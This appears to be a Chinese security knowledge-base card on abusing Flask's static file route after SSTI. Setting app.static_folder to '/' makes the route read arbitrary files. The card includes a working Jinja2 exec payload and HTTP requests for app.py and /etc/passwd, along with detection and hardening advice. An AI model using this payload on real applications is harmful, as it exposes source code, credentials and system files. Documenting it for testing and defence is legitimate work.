---
id: web-python-framework-flask-static-folder-arbitrary-file-read
title: Flask 运行期改写 static_folder 指向根目录：经 /static/ 读取任意文件
type: scenario
domain: web
path: web/python/framework
technique: flask-static-folder-arbitrary-read
tags:
- web
- python
- flask
- ssti
- file-read
- static
- post-exploitation
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V21
  verified_at: '2026-11-05T02:33:22+08:00'
  notes: 已对照原文核对：原文仅一行 app.static_url_path="/static";app.static_folder="/" 并注明经static/app.py读源码，无实测截图，卡内confidence medium恰当。核对时修正技术表述：static_url_path在初始化注册路由时读取，运行期赋值不改变路由前缀；生效键是static_folder，静态视图每次请求读取它。未验证点：原文未实测，未本机复跑；frontmatter无sources/source_url。
url: /docs/web/python/framework/web-python-framework-flask-static-folder-arbitrary-file-read/
draft: false
kb_aliases:
- Flask static_folder 任意文件读取
- static_url_path 改写
- Flask 读源码
- static 路由目录穿越
- app.static_folder 后门
---

## 一句话结论

在 Flask 应用内拿到 `exec`/SSTI 后，把 `app.static_folder` 改成 `/`，即可通过 Flask 已注册的静态文件路由（默认为 `/static/<path:filename>`）读取进程权限范围内的任意文件（如 `app.py`、配置、`/etc/passwd`），无需额外上传 webshell。

## 原理

- Flask 在初始化时若 `static_folder` 不为 `None`，会注册一条静态路由：`/<static_url_path>/<path:filename>`，其视图函数内部调用 `send_from_directory(app.static_folder, filename)`，把 `static_folder` 作为根目录拼接请求路径。
- `static_folder` 是 Flask 应用实例的普通属性，静态视图函数每次请求都会读取它，运行期通过 SSTI/`exec` 修改后下一次请求即生效；`static_url_path` 只在应用初始化注册路由时使用，运行期修改它不会新增或改变已有路由前缀。
- 把 `static_folder` 设为 `/` 后，`send_from_directory` 的根变成文件系统根，`/static/app.py` 映射到 `/app.py`，`/static/etc/passwd` 映射到 `/etc/passwd`；`send_from_directory` 自带的安全检查只阻止逃逸出 `static_folder`，而根目录本身就是允许范围。
- 该改动只影响当前进程，重启恢复默认值；因此它常作为 SSTI 后“低噪声读文件”的补充手段，而不是持久化后门。

## 触发条件

- 应用存在 SSTI 或任意 `exec`/`eval`，可取得 `current_app` 并修改其属性。
- 应用启用了静态文件路由（Flask 默认 `static_folder='static'`、`static_url_path='/static'`；若构造时显式 `static_folder=None` 则不成立）。
- 目标文件对 Flask 进程用户可读；路径需落在 `static_folder` 之下（设为 `/` 即整个文件系统）。
- 攻击者能访问 `/static/...` 路由，且前置反向代理/鉴权未拦截该前缀。

## 利用步骤

1. 通过 SSTI 取得 `app`（如 `url_for.__globals__['current_app']`）。
2. 执行属性改写：`app.static_folder="/"`（原文还写了 `app.static_url_path="/static"`，但该属性在初始化注册路由时已被读取，运行期赋值是 no-op）。
3. 访问已注册前缀下的路径，如 `/static/app.py`、`/static/../etc/passwd` 或 `/static/etc/passwd`（取决于 Werkzeug 路径规范化），确认返回文件内容。
4. 读取源码、数据库配置、密钥文件等，为进一步利用提供信息。
5. 若原 `static_url_path` 不是 `/static`，先读取原值并以该前缀访问；运行期改 `static_url_path` 不会重新注册路由。

## PoC

通过 Jinja2 SSTI 改写：

```jinja
{{url_for.__globals__['__builtins__']['exec'](
  'app.static_folder="/"',
  {'app': url_for.__globals__['current_app']}
)}}
```

原文同时赋值 `app.static_url_path="/static"`，但该赋值不改变已注册路由（默认前缀本就是 `/static` 时无副作用）。

随后请求：

```http
GET /static/app.py HTTP/1.1
Host: target
```

```http
GET /static/etc/passwd HTTP/1.1
Host: target
```

若目标静态前缀不同，先读取 `app.static_url_path`：

```jinja
{{url_for.__globals__['current_app'].static_url_path}}
```

## 变体与关联

- 变体：只改 `static_folder` 指向应用源码目录（如 `/app`），读取范围更小但更隐蔽；静态路由前缀仍是初始化时的 `static_url_path`，无法在运行期改挂到其他前缀。
- 变体：结合 `send_file`/`send_from_directory` 的其他调用点，或修改模板加载器 `jinja_loader.searchpath` 读取任意模板。
- 关联卡片：[[web-python-framework-pydash-set-jinja-loader-searchpath]]（模板加载路径改写）、[[web-python-framework-flask-route-registration-memshell]]（同一 SSTI 前置下的路由后门）。
- 边界：Werkzeug 会对 `..` 做规范化并拒绝逃逸出 `static_folder`，所以必须把根设为 `/` 或目标文件所在目录；进程权限、容器只读挂载、反向代理对 `/static/` 的拦截都会影响可达性。

## 检测与防御

- 检测：运行期对比 `app.static_folder`/`app.static_url_path` 与启动配置；审计 `/static/` 下对 `.py`、`.env`、`.git`、`/etc/` 等非静态资源的请求；关注 200 响应中返回源码/配置内容。
- 防御：生产环境用 `static_folder=None` 或 Nginx 直接托管静态资源并禁用 Flask 静态路由；把源码与配置放在 Web 根之外；容器内以只读文件系统运行，限制进程可读范围。
- 加固：SSTI 是前置条件，必须阻断模板拼接与任意 `exec`；发现被改写后重启进程恢复配置，并轮换可能已泄露的密钥。
